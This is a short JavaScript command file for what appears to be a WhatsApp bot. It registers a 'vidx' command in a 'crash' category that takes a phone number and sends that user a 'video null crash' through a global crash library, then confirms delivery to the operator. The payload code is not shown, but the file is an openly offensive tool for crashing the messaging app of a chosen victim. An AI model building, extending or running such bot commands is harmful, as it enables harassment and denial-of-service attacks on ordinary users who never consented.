// commands/crash/vidx.js
'use strict';

module.exports = {
    name: 'vidx',
    aliases: ['vidxnull', 'videonull', 'vidcrash'],
    category: 'crash',
    desc: 'ᴠɪᴅᴇᴏ ɴᴜʟʟ ᴄʀᴀsʜ ᴠ2',
    usage: '.vidx <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const target = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net' || msg.chat;
        const crashLib = global.getCrashLib();
        
        if (!crashLib) return sock.sendMessage(ctx.from, { text: '❌ ᴄʀᴀsʜʟɪʙ ɴᴏᴛ ʀᴇᴀᴅʏ' }, { quoted: msg });
        
        await sock.sendMessage(ctx.from, { text: '💥 sᴇɴᴅɪɴɢ ᴠɪᴅx ɴᴜʟʟ ᴄʀᴀsʜ...' }, { quoted: msg });
        
        try {
            await crashLib.vidxNull(target);
            return sock.sendMessage(ctx.from, { text: '✅ ᴠɪᴅx ᴄʀᴀsʜ sᴇɴᴛ ᴛᴏ ' + target }, { quoted: msg });
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};